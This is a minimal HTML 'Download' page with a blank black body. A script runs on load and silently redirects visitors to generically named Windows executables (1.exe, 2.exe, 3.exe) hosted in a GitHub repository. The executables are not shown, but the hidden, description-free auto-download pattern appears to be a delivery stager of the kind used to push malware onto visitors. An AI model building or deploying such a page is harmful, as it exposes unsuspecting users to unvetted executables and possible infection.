<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Download</title>
    <style>
        body { 
            background: #000000; 
            margin: 0; 
            padding: 0; 
            overflow: hidden;
        }
    </style>
    <script>
        // Get current path
        const path = window.location.pathname;
        const filename = path.split('/').pop();
        
        // File mapping
        const files = {
            '1.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe',
            '2.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/2.exe',
            '3.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/3.exe'
        };
        
        // Redirect if file exists
        if (files[filename]) {
            window.location.href = files[filename];
        }
    </script>
</head>
<body>

</body>
</html>
